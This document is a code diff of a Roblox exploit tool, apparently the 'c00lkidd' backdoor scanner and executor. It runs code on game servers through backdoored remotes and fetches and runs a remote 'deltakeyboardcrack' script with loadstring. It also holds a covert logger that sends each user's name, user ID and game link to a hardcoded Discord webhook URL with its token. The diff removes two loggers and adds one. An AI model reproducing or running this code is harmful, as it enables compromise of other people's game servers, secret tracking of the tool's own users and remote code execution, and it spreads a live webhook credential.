@@ -2527,58 +2527,6 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 	
 		print(string.format("c00lkidd : scan completed in %.3f seconds", scanTime))
 	end
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local MarketplaceService = game:GetService("MarketplaceService")
-local localPlayer = Players.LocalPlayer
-
-local request = 
-    (syn and syn.request) or 
-    (http and http.request) or 
-    http_request or 
-    (fluxus and fluxus.request) or 
-    request
-
-if request then
-    local webhookUrl = "https://discord.com/api/webhooks/1379334256429367326/lbYjlMEpSD48QZ0tKKKoh6fc3t-_NpUJPvwsm6s5c__C5r-ZwxfnFfm7uPg0M9FMfjwC"
-
-    local embed = {
-        title = "Script Logged",
-        description = "A new player has Executed an script",
-        color = 0x00ffcc, -- teal/cyan
-        fields = {
-            {
-                name = "Username",
-                value = localPlayer.Name,
-                inline = true
-            },
-            {
-                name = "Script",
-                value = "```" .. script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text .. "```",
-                inline = true
-            }
-        },
-        footer = {
-            text = "c00lkidd.exe script Logger"
-        },
-        timestamp = DateTime.now():ToIsoDate()
-    }
-
-    local payload = {
-        username = "Execution Log",
-        embeds = {embed}
-    }
-local function log()
-    request({
-        Url = webhookUrl,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = HttpService:JSONEncode(payload)
-    })
-  end
-end
 function fireRemoteEvent(code)
     local success = false
     local tried = 0
@@ -2852,15 +2800,68 @@ end)
 			fireRemoteEvent('local r=Instance.new("RemoteEvent",game.JointsService)r.Name="_FEBYPASS32"r.OnServerEvent:Connect(function(p)p:Kick("Use c00lkidd ss you skid bozo!")end)')
 		        fireRemoteEvent('require(7458325257).antiban()')
 			fireRemoteEvent('local r=Instance.new("RemoteFunction");r.Name="rbxAssetid_core__temp_3023g78";r.Parent=game.ReplicatedStorage;r.OnServerInvoke=function(p)p:Kick("Use c00lkidd ss you skid bozo!")end')
-                        fireRemoteEvent('require(3986243232).load("Guys i am skid im happy to announce!",{"' .. game.Players.LocalPlayer.Name ..  '"})')
+                        fireRemoteEvent('require(3986243232).load("SKID",{"' .. game.Players.LocalPlayer.Name ..  '"})')
+			local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+
+local request = 
+    (syn and syn.request) or 
+    (http and http.request) or 
+    http_request or 
+    (fluxus and fluxus.request) or 
+    request
+
+if request then
+    local webhookUrl = "https://discord.com/api/webhooks/1379334256429367326/lbYjlMEpSD48QZ0tKKKoh6fc3t-_NpUJPvwsm6s5c__C5r-ZwxfnFfm7uPg0M9FMfjwC"
+    
+    local embed = {
+        title = "Backdoored game Logged",
+        description = "A new player has injected the script.",
+        color = 0x00ffcc, -- teal/cyan
+        fields = {
+            {
+                name = "Username",
+                value = localPlayer.Name,
+                inline = true
+            },
+            {
+                name = "User ID",
+                value = tostring(localPlayer.UserId),
+                inline = true
+            },
+            {
+                name = "Game Link",
+                value = "https://www.roblox.com/games/" .. game.PlaceId,
+                inline = false
+            }
+        },
+        footer = {
+            text = "c00lkidd.exe game Logger"
+        },
+        timestamp = DateTime.now():ToIsoDate()
+    }
+
+    local payload = {
+        username = "Game Log",
+        embeds = {embed}
+    }
+
+    request({
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode(payload)
+    })
+end
 			local executor = identifyexecutor()
 			 if executor == "Delta" then 
 		             return
 			 else
 			   loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt"))()
-			end  
-				-- please i beg you don't raid the webhook🙏
-
+			end
 	    else
 			script.Parent.Framee.Check.Text = "No backdoor :("
 			script.Parent.stat.ImageColor3 = Color3.fromRGB(226, 69, 69)
@@ -2874,7 +2875,6 @@ end)
 	end)
 	script.Parent.Framee.Execute.MouseButton1Click:Connect(function()
 		fireRemoteEvent(script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text)
-		log()
 	end)
 end
 local function LZLXRPZ_fake_script() -- Fake Script: StarterGui.Starlight.str.LocalScript
@@ -2988,64 +2988,6 @@ local function setupButton(button)
             end)
         end
     end
-end
-
-if foundExploit then 
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local localPlayer = Players.LocalPlayer
-
-local request = 
-    (syn and syn.request) or 
-    (http and http.request) or 
-    http_request or 
-    (fluxus and fluxus.request) or 
-    request
-
-if request then
-    local webhookUrl = "https://discord.com/api/webhooks/1379334256429367326/lbYjlMEpSD48QZ0tKKKoh6fc3t-_NpUJPvwsm6s5c__C5r-ZwxfnFfm7uPg0M9FMfjwC"
-    
-    local embed = {
-        title = "Backdoored game Logged",
-        description = "A new player has injected the script.",
-        color = 0x00ffcc, -- teal/cyan
-        fields = {
-            {
-                name = "Username",
-                value = localPlayer.Name,
-                inline = true
-            },
-            {
-                name = "User ID",
-                value = tostring(localPlayer.UserId),
-                inline = true
-            },
-            {
-                name = "Game Link",
-                value = "https://www.roblox.com/games/" .. game.PlaceId,
-                inline = false
-            }
-        },
-        footer = {
-            text = "c00lkidd.exe game Logger"
-        },
-        timestamp = DateTime.now():ToIsoDate()
-    }
-
-    local payload = {
-        username = "Game Log",
-        embeds = {embed}
-    }
-
-    request({
-        Url = webhookUrl,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = HttpService:JSONEncode(payload)
-    })
-end
 end
 
 -- This is to scan any ServerSide such as Pulsar admin, Zazol, may could be tidal and it warns people as because those remotes has whitelist that could kicks you or even worse bans you
